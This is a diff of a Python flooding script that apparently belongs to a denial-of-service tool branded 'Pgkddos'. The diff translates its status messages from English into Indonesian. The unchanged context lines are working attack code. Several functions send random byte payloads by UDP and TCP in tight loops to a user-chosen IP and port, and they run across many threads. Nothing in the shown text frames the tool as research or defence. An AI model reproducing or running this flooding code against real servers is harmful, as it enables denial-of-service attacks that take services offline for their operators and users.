@@ -90,9 +90,9 @@ def xxxx():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[32m=====> Menyerang Ke Server \033[0m%s:%s!!! Dengan Tools Pgkddos"%(ip,port))
     except:
-      print("[!] Server Attack")
+      print("[!] Menyerang Server")
 
 def xxx():
   data = random._urandom(998)
@@ -103,9 +103,9 @@ def xxx():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[32m=====> Menyerang Ke Server \033[0m%s:%s!!! Dengan Tools Pgkddos"%(ip,port))
     except:
-      print("[!] Server Attack")
+      print("[!] Menyerang Server")
 
 def xx():
   data = random._urandom(871)
@@ -117,10 +117,10 @@ def xx():
       s.send(data)
       for x in range(times):
         s.send(data)
-        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[32m=====> Menyerang Ke Server \033[0m%s:%s!!! Dengan Tools Pgkddos"%(ip,port))
     except:
       s.close()
-      print("[!] Server Attack")
+      print("[!] Menyerang Server")
 
 def x():
   data = random._urandom(871)
@@ -132,10 +132,10 @@ def x():
       s.send(data)
       for x in range(times):
         s.send(data)
-        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[32m=====> Menyerang Ke Server \033[0m%s:%s!!! Dengan Tools Pgkddos"%(ip,port))
     except:
       s.close()
-      print("[!] Server Attack")
+      print("[!] Menyerang Server")
 
 for y in range(threads):
   if choice == 'y':
